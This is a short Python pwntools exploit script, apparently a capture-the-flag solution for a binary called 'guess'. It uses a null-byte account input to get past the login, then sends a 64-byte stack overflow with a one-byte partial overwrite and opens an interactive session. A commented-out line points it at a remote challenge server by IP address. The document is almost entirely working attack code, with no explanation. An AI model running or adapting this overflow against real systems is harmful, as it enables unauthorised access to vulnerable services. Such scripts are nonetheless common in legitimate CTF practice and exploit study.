from pwn import *
import time
from LibcSearcher import *
p=process("./guess")
# p=remote("61.147.171.105",49856)
elf=ELF("./guess")
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
# context.log_level=True
ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
inta = lambda   : p.interactive()
def gdba(x=''):
	if type(p)==pwnlib.tubes.remote.remote:
		return
	elif type(p)==pwnlib.tubes.process.process:
		gdb.attach(p,x)
		pause()
ru(b'Choice: ')
sl(b'1')
ru(b'Account: ')
sl(b'\x00')
gdba('b *$rebase(0x00000000000009BE)')
ru(b'Password: ')
sl(b'aaaaaaaa')
ru(b'Welcome, Boss. Leave your valuable comments: ')
payload=b'a'*64+p8(0x148-0xf0)#+p64(0xdeadbeef)
p.sendline(payload)
inta()
